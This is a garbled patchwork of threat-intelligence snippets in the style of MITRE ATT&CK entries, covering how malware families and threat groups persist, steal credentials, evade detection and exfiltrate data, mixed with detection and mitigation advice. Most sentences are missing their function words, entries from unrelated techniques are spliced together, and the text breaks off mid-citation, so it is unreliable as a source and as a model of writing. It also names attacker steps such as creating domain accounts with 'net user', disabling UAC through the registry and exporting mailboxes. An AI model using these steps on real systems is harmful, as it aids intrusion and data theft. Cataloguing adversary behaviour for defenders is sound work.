[Hydraq](https://attack.mitre.org/software/S0203) connects predefined domain port 443 exfil gathered information.(Citation: Symantec Hydraq Jan 2010) [Shamoon](https://attack.mitre.org/software/S0140) attempts disable UAC remote restrictions modifying Registry.(Citation: Palo Alto Shamoon Nov 2016) [RCSession](https://attack.mitre.org/software/S0662) collect data compromised host.(Citation: Profero APT27 December 2020)(Citation: Trend Micro DRBControl February 2020) Extra scrutiny suspicious modification Registry COR_ENABLE_PROFILING, COR_PROFILER, COR_PROFILER_PATH command tools wmic.exe, setx.exe, [Reg](https://attack.mitre.org/software/S0075). Monitoring command-line arguments indicating change COR_PROFILER variables aid detection. [Kimsuky](https://attack.mitre.org/groups/G0094) scripts startup folder persistence modified `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\RunOnce` Registry key.(Citation: Securelist Kimsuky Sept 2013)(Citation: CISA AA20-301A Kimsuky)(Citation: Crowdstrike GTR2020 Mar 2020)(Citation: Talos Kimsuky Nov 2021)(Citation: KISA Operation Muzabi) [Cobalt Strike](https://attack.mitre.org/software/S0154) <code>WinRM</code> execute payload remote host.(Citation: cobaltstrike manual)(Citation: Cobalt Strike Manual 4.3 November 2020) (Citation: Trend Micro TA505 June 2019) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). establish persistence, [SslMM](https://attack.mitre.org/software/S0058) identifies Start Menu Startup directory drops link executable disguised “Office Start,” “Yahoo Talk,” “MSN Gaming Z0ne,” “MSN Talk” shortcut.(Citation: Baumgartner Naikon 2015) [POWERSTATS](https://attack.mitre.org/software/S0223) VBScript (VBE) code execution.(Citation: ClearSky MuddyWater Nov 2018)(Citation: TrendMicro POWERSTATS V3 June 2019) [Dragonfly](https://attack.mitre.org/groups/G0035) scanned targeted systems vulnerable Citrix Exchange services.(Citation: CISA AA20-296A Berserk Bear December 2020) Monitor interactions images containers users identify modified anomalously.
In containerized environments, detectable monitoring Docker daemon logs setting monitoring Kubernetes audit logs depending registry configuration. 
[InvisiMole](https://attack.mitre.org/software/S0260) disconnect connected remote drives.(Citation: ESET InvisiMole June 2018) [Ferocious](https://attack.mitre.org/software/S0679) anti-sandbox checks Excel 4.0 function <code>GET.WORKSPACE</code> determine OS version, mouse present, host capable playing sounds.(Citation: Kaspersky WIRTE November 2021) [Patchwork](https://attack.mitre.org/groups/G0040) reverse Meterpreter.(Citation: Cymmetria Patchwork) [Patchwork](https://attack.mitre.org/groups/G0040) JavaScript code .SCT files victim machines.(Citation: TrendMicro Patchwork Dec 2017)(Citation: Volexity Patchwork June 2018) (Citation: NCSC Sandworm Feb 2020)(Citation: District Court Indictment GRU Unit 74455 October 2020)(Citation: NCSC Olympic Attacks October 2020)(Citation: Secureworks IRON VIKING )(Citation: Trend Micro Cyclops Blink March 2022) [ObliqueRAT](https://attack.mitre.org/software/S0644) check blocklisted process names compromised host.(Citation: Talos Oblique RAT March 2021) [IcedID](https://attack.mitre.org/software/S0483) injection attacks redirect victims spoofed sites designed harvest banking credentials.  [IcedID](https://attack.mitre.org/software/S0483) signed TLS certificate connection spoofed simultaneously maintains live connection legitimate display correct URL certificates browser.(Citation: IBM IcedID November 2017)(Citation: Juniper IcedID June 2020) [C0015](https://attack.mitre.org/campaigns/C0015), threat actors command `net view /all time` gather local time compromised network.(Citation: DFIR Conti Bazar Nov 2021) [Prikormka](https://attack.mitre.org/software/S0113) adds Registry key guidVGA guidVSA.(Citation: ESET Operation Groundbait) [Darkhotel](https://attack.mitre.org/groups/G0012) malware disguised Secure (SSH) tool.(Citation: DUBNIUM June 2016) [HyperStack](https://attack.mitre.org/software/S0537) enumerate account names remote share.(Citation: Accenture HyperStack October 2020) [QakBot](https://attack.mitre.org/software/S0650) capture keystrokes compromised host.(Citation: Kroll Qakbot June 2020)(Citation: Trend Micro Qakbot December 2020)(Citation: Kaspersky QakBot September 2021) [USBStealer](https://attack.mitre.org/software/S0136) drops commands victim removable media drive inserted victim, commands executed drive inserted victim.(Citation: ESET Sednit USBStealer 2014) (Citation: FireEye APT41 Aug 2019) [Ferocious](https://attack.mitre.org/software/S0679) <code>GET.WORKSPACE</code> Excel determine OS version compromised host.(Citation: Kaspersky WIRTE November 2021) [down_new](https://attack.mitre.org/software/S0472) ability gather installed applications.(Citation: Trend Micro Tick November 2019) [AADInternals](https://attack.mitre.org/software/S0677) steal users’ access tokens phishing emails malicious links.(Citation: AADInternals Documentation) [Proxysvc](https://attack.mitre.org/software/S0238) performs data exfiltration control server channel custom protocol.(Citation: McAfee GhostSecret) [Gamaredon Group](https://attack.mitre.org/groups/G0047) modules automatically upload gathered documents C2 server.(Citation: ESET Gamaredon June 2020) [ShimRatReporter](https://attack.mitre.org/software/S0445) gathered operating specific Windows version infected machine.(Citation: FOX-IT 2016 Mofang) [Threat Group-1314](https://attack.mitre.org/groups/G0028) actors compromised domain credentials victim's endpoint management platform, Altiris, laterally.(Citation: Dell TG-1314) [GreyEnergy](https://attack.mitre.org/software/S0342) packed obfuscation.(Citation: ESET GreyEnergy Oct 2018) [Gamaredon Group](https://attack.mitre.org/groups/G0047) HTTPS C2 communications.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: TrendMicro Gamaredon April 2020)(Citation: ESET Gamaredon June 2020)(Citation: Symantec Shuckworm January 2022)(Citation: CERT-EE Gamaredon January 2021)(Citation: Unit 42 Gamaredon February 2022) [Dyre](https://attack.mitre.org/software/S0024) delivered encrypted resources unpacked execution.(Citation: Malwarebytes Dyreza November 2015) [Bazar](https://attack.mitre.org/software/S0534) download deploy additional payloads, including ransomware post-exploitation frameworks [Cobalt Strike](https://attack.mitre.org/software/S0154).(Citation: Cybereason Bazar July 2020)(Citation: Zscaler Bazar September 2020)(Citation: NCC Team9 June 2020)(Citation: CrowdStrike Wizard Spider October 2020) Network intrusion detection prevention systems network signatures identify traffic specific adversary malware mitigate obfuscation activity network level. Monitor processes inject dynamic-link libraries (DLLs) processes evade process-based defenses elevate privileges. [Raindrop](https://attack.mitre.org/software/S0565) steganography locate start encoded payload legitimate 7-Zip code.(Citation: Symantec RAINDROP January 2021) [SILENTTRINITY](https://attack.mitre.org/software/S0692) modules bypass UAC, including Window's Device Manager, Manage Optional Features, image hijack `.msc` file extension.(Citation: GitHub SILENTTRINITY Modules July 2019)    [RTM](https://attack.mitre.org/software/S0148) name, OS version, default language identifier.(Citation: ESET RTM Feb 2017) Develop robust cyber threat intelligence capability determine types levels threat software exploits 0-days organization. [Elise](https://attack.mitre.org/software/S0081) exfiltrates data cookie values Base64-encoded.(Citation: Lotus Blossom Jun 2015) [Wizard Spider](https://attack.mitre.org/groups/G0102) spearphishing attachments deliver documents macros PDFs malicious links download [Emotet](https://attack.mitre.org/software/S0367), Bokbot, [TrickBot](https://attack.mitre.org/software/S0266), [Bazar](https://attack.mitre.org/software/S0534).(Citation: CrowdStrike Grim Spider 2019)(Citation: Red Canary Hospital Thwarted Ryuk October 2020) [KONNI](https://attack.mitre.org/software/S0356) data files C2 server.(Citation: Talos Konni 2017)(Citation: Malwarebytes Konni Aug 2021)(Citation: Malwarebytes KONNI Evolves Jan 2022) [Revenge RAT](https://attack.mitre.org/software/S0379) plugin screen capture.(Citation: Cylance Shaheen Nov 2018) [Out1](https://attack.mitre.org/software/S0594) parse e-mails target machine.(Citation: Trend Micro Muddy Water March 2021) [menuPass](https://attack.mitre.org/groups/G0045) modified version pentesting tools wmiexec.vbs secretsdump.py dump credentials.(Citation: PWC Cloud Hopper Technical Annex April 2017)(Citation: Github AD-Pentest-Script) [Patchwork](https://attack.mitre.org/groups/G0040) altered [NDiskMonitor](https://attack.mitre.org/software/S0272) samples adding bytes random letters attempt change file hashes.(Citation: TrendMicro Patchwork Dec 2017) [Gelsemium](https://attack.mitre.org/software/S0666) random files Registry obscure malware behavior sandbox analysis.(Citation: ESET Gelsemium June 2021) [KOCTOPUS](https://attack.mitre.org/software/S0669) PowerShell commands download additional files.(Citation: MalwareBytes LazyScripter Feb 2021) [APT39](https://attack.mitre.org/groups/G0087) BITS protocol exfiltrate stolen data compromised host.(Citation: FBI FLASH APT39 September 2020) [Bankshot](https://attack.mitre.org/software/S0239) binds listens port 1058.(Citation: US-CERT Bankshot Dec 2017) [Stuxnet](https://attack.mitre.org/software/S0603) propagates network shares.(Citation: Symantec W.32 Stuxnet Dossier) [Kazuar](https://attack.mitre.org/software/S0265) sleep specific time set communicate specific intervals.(Citation: Unit 42 Kazuar 2017) [Higaisa](https://attack.mitre.org/groups/G0126)’s shellcode attempted process current process.(Citation: Zscaler Higaisa 2020) [CostaRicto](https://attack.mitre.org/campaigns/C0004), threat actors 64-bit backdoor loader [PS1](https://attack.mitre.org/software/S0613).(Citation: BlackBerry CostaRicto November 2020) [Goopy](https://attack.mitre.org/software/S0477) ability  enumerate infected system's user <code>GetUserNameW</code>.(Citation: Cybereason Cobalt Kitty 2017) [UNC2452](https://attack.mitre.org/groups/G0118) collected emails specific individuals, executives staff, <code>New-MailboxExportRequest</code> <code>Get-MailboxExportRequest</code>.(Citation: Volexity SolarWinds) (Citation: CrowdStrike Putter Panda) [KillDisk](https://attack.mitre.org/software/S0607) ransomware component encrypts files AES key RSA-1028 encrypted.(Citation: KillDisk Ransomware) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [Dragonfly](https://attack.mitre.org/groups/G0035) registry ntdll Registry key establish persistence.(Citation: US-CERT TA18-074A) [MirageFox](https://attack.mitre.org/software/S0280) capability execute commands cmd.exe.(Citation: APT15 Intezer June 2018) Detection Network DoS achieved traffic volume sufficient impact availability service, response time typically requires aggressive monitoring responsiveness services upstream network service provider. Monitor logging, messaging, artifacts highlighting health host sensors (ex: metrics, errors, exceptions logging applications) Monitor contextual data file, include name, content (ex: signature, headers, data/media), user/ower, permissions, NTFS file attributes hide malicious data evade detection. Forensic techniques exist identify stored NTFS EA. (Citation: Journey ZeroAccess NTFS EA) <code>net user username \password \domain</code> commands [Net](https://attack.mitre.org/software/S0039) create domain account.(Citation: Savill 1999) [Leafminer](https://attack.mitre.org/groups/G0077) tool called Imecab set persistent remote access account victim machine.(Citation: Symantec Leafminer July 2018) [Orz](https://attack.mitre.org/software/S0229) gather victim proxy information.(Citation: Proofpoint Leviathan Oct 2017) [APT39](https://attack.mitre.org/groups/G0087) created accounts multiple compromised hosts perform actions network.(Citation: BitDefender Chafer 2020) [WastedLocker](https://attack.mitre.org/software/S0612) identify network adjacent accessible drives.(Citation: Sentinel Labs WastedLocker July 2020) [Sliver](https://attack.mitre.org/software/S0633) exfiltrate files victim <code>download</code> command.(Citation: GitHub Sliver Download) compromising victim, [Poseidon Group](https://attack.mitre.org/groups/G0033) lists running processes.(Citation: Kaspersky Poseidon Group) [APT32](https://attack.mitre.org/groups/G0050) shells maintain access victim websites.(Citation: Volexity OceanLotus Nov 2017) [Action RAT](https://attack.mitre.org/software/S1028) ability collect hostname, OS version, OS architecture infected host.(Citation: MalwareBytes SideCopy Dec 2021) [KGH_SPY](https://attack.mitre.org/software/S0526) encrypted strings installer.(Citation: Cybereason Kimsuky November 2020) [Donut](https://attack.mitre.org/software/S0695) download execute staged shellcode payloads.(Citation: Donut Github) [APT29](https://attack.mitre.org/groups/G0016) exfiltrated collected data simple HTTPS request password-protected archive staged victim's OWA servers.(Citation: Volexity SolarWinds) [Olympic Destroyer](https://attack.mitre.org/software/S0365) attempt enumerate mapped network shares attempt wipe files shares.(Citation: Talos Olympic Destroyer 2018) [PowerShower](https://attack.mitre.org/software/S0441) ability identify current user infected host.(Citation: Kaspersky Cloud Atlas August 2019) [SUPERNOVA](https://attack.mitre.org/software/S0578) contained Base64-encoded strings.(Citation: CISA Supernova Jan 2021) [Remcos](https://attack.mitre.org/software/S0332) access system’s webcam pictures.(Citation: Fortinet Remcos Feb 2017) "tDiscoverer" variant [HAMMERTOSS](https://attack.mitre.org/software/S0037) establishes C2 channel downloading resources services Twitter GitHub. [HAMMERTOSS](https://attack.mitre.org/software/S0037) binaries algorithm generates Twitter handle malware check instructions day.(Citation: FireEye APT29) (Citation: Unit 42 ProjectM March 2016) [Avenger](https://attack.mitre.org/software/S0473) extract backdoor malware downloaded images.(Citation: Trend Micro Tick November 2019) [Felismus](https://attack.mitre.org/software/S0171) collects victim LAN IP address sends C2 server.(Citation: Forcepoint Felismus Mar 2017) [Earth Lusca](https://attack.mitre.org/groups/G1006) Base64 encode strings.(Citation: TrendMicro EarthLusca 2022) application control configured block execution <code>msbuild.exe</code> required network prevent potential misuse adversaries. example, Windows Windows Server 2016 above, Windows Defender Application Control (WDAC) policy rules applied block <code>msbuild.exe</code> application prevent abuse.(Citation: WDAC) (Citation: JPCert TSCookie March 2018) [APT28](https://attack.mitre.org/groups/G0007) Powershell cmdlet grant <code>ApplicationImpersonation</code> role compromised account.(Citation: Cybersecurity Advisory GRU Brute Force Campaign July 2021) [SNUGRIDE](https://attack.mitre.org/software/S0159) establishes persistence Registry key.(Citation: FireEye APT10 April 2017) [TrickBot](https://attack.mitre.org/software/S0266) modify registry entries.(Citation: Trend Micro Trickbot Nov 2018) [APT29](https://attack.mitre.org/groups/G0016) embedded ISO images VHDX files evade Mark-of-the-Web.(Citation: ESET T3 Threat Report 2021) [Empire](https://attack.mitre.org/software/S0363) modules interact Windows task scheduler.(Citation: Github PowerShell Empire) Process monitoring detect servers components perform suspicious actions running cmd.exe accessing files. Utilize Yama (ex: /proc/sys/kernel/yama/ptrace_scope) mitigate ptrace based process injection restricting ptrace privileged users only. mitigation controls involve deployment security kernel modules provide advanced access control process restrictions SELinux, grsecurity, AppArmor.  [RemoteUtilities](https://attack.mitre.org/software/S0592) enumerate files directories target machine.(Citation: Trend Micro Muddy Water March 2021) [OutSteel](https://attack.mitre.org/software/S1017) distributed malicious attachment spearphishing email.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [SoreFang](https://attack.mitre.org/software/S0516) ability encode RC6 encrypt data C2.(Citation: CISA SoreFang July 2016) [FIN7](https://attack.mitre.org/groups/G0046) actors mailed USB drives potential victims malware downloads installs backdoors, including ransomware operations.(Citation: FBI Flash FIN7 USB) [Lizar](https://attack.mitre.org/software/S0681) support encrypted communications client server.(Citation: Threatpost Lizar 2021)(Citation: BiZone Lizar 2021) [Bumblebee](https://attack.mitre.org/software/S1039) gained execution luring users malicious attachments.(Citation: Proofpoint Bumblebee April 2022)(Citation: Symantec Bumblebee June 2022)(Citation: Cybereason Bumblebee August 2022)(Citation: Medium Ali Salem Bumblebee April 2022)
 [Metamorfo](https://attack.mitre.org/software/S0455) <code>cmd.exe /c</code> execute files.(Citation: Medium Metamorfo Apr 2020)  (Citation: FireEye APT33 Sept 2017)(Citation: FireEye APT33 Webinar Sept 2017) [Octopus](https://attack.mitre.org/software/S0340) download additional files tools victim’s machine.(Citation: Securelist Octopus Oct 2018)(Citation: Security Affairs DustSquad Oct 2018)(Citation: ESET Nomadic Octopus 2018) file AcroRD32.exe, legitimate process Adobe's Acrobat Reader, [APT1](https://attack.mitre.org/groups/G0006) malware.(Citation: Mandiant APT1)(Citation: Mandiant APT1 Appendix) [Derusbi](https://attack.mitre.org/software/S0021) capable performing screen captures.(Citation: FireEye Periscope March 2018) [ROKRAT](https://attack.mitre.org/software/S0240) collect username compromised host.(Citation: Malwarebytes RokRAT VBA January 2021) [OutSteel](https://attack.mitre.org/software/S1017) delete successful execution follow-on payload.(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) (Citation: MalwareBytes LazyScripter Feb 2021) [Lazarus Group](https://attack.mitre.org/groups/G0032) malware SierraCharlie RDP propagation.(Citation: Novetta Blockbuster)(Citation: Novetta Blockbuster RATs) (Citation: Lookout Dark Caracal Jan 2018) [H1N1](https://attack.mitre.org/software/S0132) obfuscates C2 traffic altered version base64.(Citation: Cisco H1N1 2) [Saint Bot](https://attack.mitre.org/software/S1018) distributed malicious attachments spearphishing emails.(Citation: Malwarebytes Saint Bot April 2021)(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ) [Cobalt Strike](https://attack.mitre.org/software/S0154) ability AES-256 symmetric encryption CBC mode HMAC-SHA-256 encrypt task commands XOR encrypt code configuration data.(Citation: Talos Cobalt Strike September 2020) Monitor executed commands arguments attempt listing services running remote hosts, including vulnerable remote software exploitation. [APT32](https://attack.mitre.org/groups/G0050)'s macOS backdoor hides clientID file chflags function.(Citation: ESET OceanLotus macOS April 2019) [ComRAT](https://attack.mitre.org/software/S0126) checked victim system's time perform tasks business hours (9 5, Monday Friday).(Citation: CISA ComRAT Oct 2020)  [FinFisher](https://attack.mitre.org/software/S0182) renames .dll files uxtheme.dll apparent attempt masquerade legitimate file.(Citation: FinFisher Citation)(Citation: FinFisher March 2018) [ObliqueRAT](https://attack.mitre.org/software/S0644) check blocklisted usernames infected endpoints.(Citation: Talos Oblique RAT March 2021) [Meteor](https://attack.mitre.org/software/S0688) `set.bat`, `update.bat`, `cache.bat`, `bcd.bat`, `msrun.bat`, scripts.(Citation: Check Meteor Aug 2021) [ShadowPad](https://attack.mitre.org/software/S0596) communicates retrieve string decoded C2 server URL.(Citation: Kaspersky ShadowPad Aug 2017) [NOKKI](https://attack.mitre.org/software/S0353) collect data victim stage <code>LOCALAPPDATA%\MicroSoft Updatea\uplog.tmp</code>.(Citation: Unit 42 NOKKI Sept 2018) [Ruler](https://attack.mitre.org/software/S0358) enumerate Exchange users dump GAL.(Citation: SensePost Ruler GitHub) [Sandworm Team](https://attack.mitre.org/groups/G0034) checks connectivity resources network.(Citation: Dragos Crashoverride 2018)  [StrongPity](https://attack.mitre.org/software/S0491) download files targets.(Citation: Bitdefender StrongPity June 2020) [TajMahal](https://attack.mitre.org/software/S0467) ability inject DLLs malicious plugins running processes.(Citation: Kaspersky TajMahal April 2019) [MarkiRAT](https://attack.mitre.org/software/S0652) store collected data locally created .nfo file.(Citation: Kaspersky Ferocious Kitten Jun 2021) [Clop](https://attack.mitre.org/software/S0611) encrypt files AES, RSA, RC4 add ".clop" extension encrypted files.(Citation: Mcafee Clop Aug 2019)(Citation: Unit42 Clop April 2021)(Citation: Cybereason Clop Dec 2020)  [Ke3chang](https://attack.mitre.org/groups/G0004) performs process discovery <code>tasklist</code> commands.(Citation: Mandiant Operation Ke3chang November 2014)(Citation: NCC APT15 Alive Strong) [APT28](https://attack.mitre.org/groups/G0007) regularly deploys publicly (ex: [Mimikatz](https://attack.mitre.org/software/S0002)) custom password retrieval tools victims.(Citation: ESET Sednit 2)(Citation: DOJ GRU Indictment Jul 2018)(Citation: District Court Indictment GRU Oct 2018)	 possible, Remote Desktop Gateway manage connections security configuration RDP network.(Citation: TechNet RDP Gateway) [S-Type](https://attack.mitre.org/software/S0085) Windows APIs, including `GetKeyboardType`, `NetUserAdd`, `NetUserDel`.(Citation: Cylance Dust Storm) [Ecipekac](https://attack.mitre.org/software/S0624) valid, legitimate digital signature evade detection.(Citation: Securelist APT10 March 2021) [CharmPower](https://attack.mitre.org/software/S0674) ability <code>ipconfig</code> enumerate network settings.(Citation: Check APT35 CharmPower January 2022) [PcShare](https://attack.mitre.org/software/S1050) upload files compromised host C2 servers.(Citation: Bitdefender FunnyDream Campaign November 2020) [Aria-body](https://attack.mitre.org/software/S0456) ability reverse SOCKS proxy module.(Citation: CheckPoint Naikon 2020) [Hydraq](https://attack.mitre.org/software/S0203) creates backdoor remote attackers check existence files, including components, retrieve list logical drives.(Citation: Symantec Trojan.Hydraq Jan 2010)(Citation: Symantec Hydraq Jan 2010) [Andariel](https://attack.mitre.org/groups/G0138) conducted spearphishing campaigns included malicious Word Excel attachments.(Citation: AhnLab Andariel Subgroup Lazarus June 2018)(Citation: MalwareBytes Lazarus-Andariel Conceals Code April 2021) [Sys10](https://attack.mitre.org/software/S0060) C2.(Citation: Baumgartner Naikon 2015) [Carberp](https://attack.mitre.org/software/S0484) XOR-based encryption mask C2 server locations trojan.(Citation: Prevx Carberp March 2011) [Goopy](https://attack.mitre.org/software/S0477) ability Outlook backdoor macro communicate C2.(Citation: Cybereason Cobalt Kitty 2017)	 [NanoCore](https://attack.mitre.org/software/S0336) modify victim's anti-virus.(Citation: DigiTrust NanoCore Jan 2017)(Citation: PaloAlto NanoCore Feb 2016) commands modify ACLs file/directory ownership built-in utilities generate false positive alert rate, compare baseline knowledge systems typically correlate modification events indications malicious activity possible. file scanning software packers artifacts packing techniques. Packing definitive indicator malicious activity, legitimate software packing techniques reduce binary size protect proprietary code. [C0011](https://attack.mitre.org/campaigns/C0011), [Transparent Tribe](https://attack.mitre.org/groups/G0134) updated version [Crimson](https://attack.mitre.org/software/S0115).(Citation: Cisco Talos Transparent Tribe Education Campaign July 2022) [Hildegard](https://attack.mitre.org/software/S0601) created user named “monerodaemon”.(Citation: Unit 42 Hildegard Malware) [Operation Dust Storm](https://attack.mitre.org/campaigns/C0016), threat actors exploited Adobe Flash vulnerability CVE-2011-0611, Windows vulnerability CVE-2010-1885, Internet Explorer vulnerabilities, including CVE-2011-1255, CVE-2012-1889, CVE-2014-0322.(Citation: Cylance Dust Storm) [FunnyDream](https://attack.mitre.org/software/S1044) upload files victims' machines.(Citation: Bitdefender FunnyDream Campaign November 2020)(Citation: Kaspersky APT Trends Q1 2020) [RTM](https://attack.mitre.org/software/S0148) download additional files.(Citation: ESET RTM Feb 2017)(Citation: Unit42 Redaman January 2019) [PLATINUM](https://attack.mitre.org/groups/G0068) Intel® Active Management Technology (AMT) Serial-over-LAN (SOL) channel command control.(Citation: PLATINUM June 2017) [SysUpdate](https://attack.mitre.org/software/S0663) load DLLs vulnerable legitimate executables.(Citation: Trend Micro Iron Tiger April 2021)
 [PcShare](https://attack.mitre.org/software/S1050) invalid certificate attempt legitimate.(Citation: Bitdefender FunnyDream Campaign November 2020) [HEXANE](https://attack.mitre.org/groups/G1001) [netstat](https://attack.mitre.org/software/S0104) monitor connections specific ports.(Citation: Kaspersky Lyceum October 2021) [APT41](https://attack.mitre.org/groups/G0096) malware variant called GOODLUCK modify registry steal credentials.(Citation: FireEye APT41 Aug 2019)(Citation: IB APT 41 June 2021) [Pasam](https://attack.mitre.org/software/S0208) creates backdoor remote attackers delete files.(Citation: Symantec Pasam 2012) (Citation: ESET Sednit 3)(Citation: Secureworks IRON TWILIGHT Active Measures March 2017) [Kimsuky](https://attack.mitre.org/groups/G0094) observed Windows Security Center hide AV software window view infected user.(Citation: Securelist Kimsuky Sept 2013)(Citation: Talos Kimsuky Nov 2021) [Pupy](https://attack.mitre.org/software/S0192) module event logs PowerShell.(Citation: GitHub Pupy) [UNC2452](https://attack.mitre.org/groups/G0118) credentials OAuth Applications Service Principals.(Citation: - Customer Guidance Nation-State Cyber Attacks)  [EXOTIC LILY](https://attack.mitre.org/groups/G1011) copied data social media sites impersonate targeted individuals.(Citation: Google EXOTIC LILY March 2022) [ThiefQuest](https://attack.mitre.org/software/S0595) obtains list running processes function <code>kill_unwanted</code>.(Citation: wardle evilquest parti) [Winnti Linux](https://attack.mitre.org/software/S0430) modified open-source userland rootkit Azazel, named libxselinux.so, hide malware's operations network activity.(Citation: Chronicle Winnti Linux 2019) Ensure proper access isolation critical network systems multi-factor authentication. [KillDisk](https://attack.mitre.org/software/S0607) ability quit delete itself.(Citation: ESET Telebots Dec 2016) [MobileOrder](https://attack.mitre.org/software/S0079) command upload C2 server victim browser bookmarks.(Citation: Scarlet Mimic Jan 2016) Audit Registry entries relevant enabling add-ins.(Citation: GlobalDotName Jun 2019)(Citation: MRWLabs Office Persistence Add-ins) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) attempted users launch malicious Word attachments delivered spearphishing emails.(Citation: Symantec Tick Apr 2016)(Citation: Trend Micro Tick November 2019) [InvisiMole](https://attack.mitre.org/software/S0260) sort collect specific documents generate list files newly inserted drive store encrypted file.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) [Stuxnet](https://attack.mitre.org/software/S0603) searches Registry indicators security programs.(Citation: Symantec W.32 Stuxnet Dossier) Monitor processes abnormal calls privileged processes, user application connecting VPN service.(Citation: versprite xpc vpn) [RunningRAT](https://attack.mitre.org/software/S0253) code event logs.(Citation: McAfee Gold Dragon) [DarkComet](https://attack.mitre.org/software/S0334) adds Registry installation routine Registry Key <code>HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System Enable LUA=”0”</code> <code>HKEY_CURRENT_USER\Software\DC3_FEXEC</code>.(Citation: TrendMicro DarkComet Sept 2014)(Citation: Malwarebytes DarkComet March 2018) [Mustang Panda](https://attack.mitre.org/groups/G0129) stored collected credential files <code>c:\windows\temp</code> prior exfiltration. [Mustang Panda](https://attack.mitre.org/groups/G0129) stored documents exfiltration hidden folder USB drives.(Citation: Secureworks BRONZE PRESIDENT December 2019)(Citation: Avira Mustang Panda January 2020) [Kimsuky](https://attack.mitre.org/groups/G0094) created services persistence.(Citation: Securelist Kimsuky Sept 2013)(Citation: CISA AA20-301A Kimsuky) [WhisperGate](https://attack.mitre.org/software/S0689) deobfuscate downloaded files stored reverse byte decrypt embedded resources multiple XOR operations.(Citation: Cisco Ukraine Wipers January 2022)(Citation: Medium S2W WhisperGate January 2022) [Exaramel Linux](https://attack.mitre.org/software/S0401) execute commands privileges specific binary setuid functionality.(Citation: ANSSI Sandworm January 2021) [HotCroissant](https://attack.mitre.org/software/S0431) ability list names windows infected host.(Citation: Carbon Black HotCroissant April 2020) [BendyBear](https://attack.mitre.org/software/S0574) ability determine local time compromised host.(Citation: Unit42 BendyBear Feb 2021)  (Citation: CISA SoreFang July 2016) [HAFNIUM](https://attack.mitre.org/groups/G0125) IP addresses publicly-accessible Exchange servers.(Citation: Volexity Exchange Marauder March 2021) Ensure applications store sensitive data credentials insecurely. (e.g. plaintext credentials code, published credentials repositories, credentials public cloud storage). [Flame](https://attack.mitre.org/software/S0143) Windows Authentication Packages persistence.(Citation: Crysys Skywiper) [StreamEx](https://attack.mitre.org/software/S0142) ability enumerate drive types.(Citation: Cylance Crew Feb 2017) [Pteranodon](https://attack.mitre.org/software/S0147) delete files interfere executing. delete temporary files initial script executes.(Citation: Palo Alto Gamaredon Feb 2017) [Proxysvc](https://attack.mitre.org/software/S0238) gathers product names Registry key: <code>HKLM\Software\Microsoft\Windows NT\CurrentVersion ProductName</code> processor description Registry key <code>HKLM\HARDWARE\DESCRIPTION\System\CentralProcessor\0 ProcessorNameString</code>.(Citation: McAfee GhostSecret) [Threat Group-3390](https://attack.mitre.org/groups/G0027) RAR compress, encrypt, password-protect files prior exfiltration.(Citation: SecureWorks BRONZE UNION June 2017) native binaries environment. Monitor unusual kernel driver installation activity abuse print processors malicious DLLs boot persistence privilege escalation. [SHOTPUT](https://attack.mitre.org/software/S0063) command process listing.(Citation: Palo Alto CVE-2015-3113 July 2015) [SeaDuke](https://attack.mitre.org/software/S0053) C2 traffic encrypted RC4 AES.(Citation: Mandiant Easy Breach)(Citation: Unit 42 SeaDuke 2015) Monitor newly executed processes, <code>eventvwr.exe</code> <code>sdclt.exe</code>, bypass UAC mechanisms elevate process privileges system. Detection efforts finding differences VBA source code p-code.(Citation: Walmart Roberts Oct 2018) VBA code extracted p-code execution tools pcodedmp disassembler. oletools toolkit leverages pcodedmp disassembler detect VBA stomping comparing keywords VBA source code p-code.(Citation: pcodedmp Bontchev)(Citation: oletools toolkit) Monitor newly executed processes removable media mounted. [Ke3chang](https://attack.mitre.org/groups/G0004) dumped credentials, including [Mimikatz](https://attack.mitre.org/software/S0002).(Citation: Mandiant Operation Ke3chang November 2014)(Citation: NCC APT15 Alive Strong)(Citation: NICKEL December 2021) [AppleJeus](https://attack.mitre.org/software/S0584) user UAC prompt elevate privileges installing.(Citation: CISA AppleJeus Feb 2021) [Bisonal](https://attack.mitre.org/software/S0268) supported proxy server.(Citation: Talos Bisonal Mar 2020) Develop publish policies define acceptable stored SharePoint repositories. Regularly check component software critical services adversaries target persistence verify integrity systems identify unexpected made.  [FIN6](https://attack.mitre.org/groups/G0037) WMI automate remote execution PowerShell scripts.(Citation: Security Intelligence Eggs Aug 2019)	 [MuddyWater](https://attack.mitre.org/groups/G0069) scheduled tasks establish persistence.(Citation: Reaqta MuddyWater November 2017) [Ramsay](https://attack.mitre.org/software/S0458) spread infecting portable executable files removable drives.(Citation: Eset Ramsay 2020)	 [PoshC2](https://attack.mitre.org/software/S0378) modules enumerating domain trusts.(Citation: GitHub PoshC2) [SombRAT](https://attack.mitre.org/software/S0615) enumerate services victim machine.(Citation: BlackBerry CostaRicto November 2020) [Hancitor](https://attack.mitre.org/software/S0499) Base64 encode malicious links. [Hancitor](https://attack.mitre.org/software/S0499) delivered compressed payloads ZIP files victims.(Citation: Threatpost Hancitor)(Citation: FireEye Hancitor) [Rocke](https://attack.mitre.org/groups/G0106) extracted tar.gz files downloading C2 server.(Citation: Talos Rocke August 2018) Disable Autorun unnecessary. (Citation: Disable Autorun) Disallow restrict removable media organizational policy level required business operations. (Citation: TechNet Removable Media Control)  [Tomiris](https://attack.mitre.org/software/S0671) upload files matching hardcoded set extensions, .doc, .docx, .pdf, .rar, C2 server.(Citation: Kaspersky Tomiris Sep 2021) [Melcoz](https://attack.mitre.org/software/S0530) packed VMProtect Themida.(Citation: Securelist Brazilian Banking Malware July 2020) [Cobalt Strike](https://attack.mitre.org/software/S0154) configured TCP, ICMP, UDP C2 communications.(Citation: Talos Cobalt Strike September 2020)(Citation: Cobalt Strike Manual 4.3 November 2020) [APT39](https://attack.mitre.org/groups/G0087) command utility network scanner written python.(Citation: BitDefender Chafer 2020)(Citation: FBI FLASH APT39 September 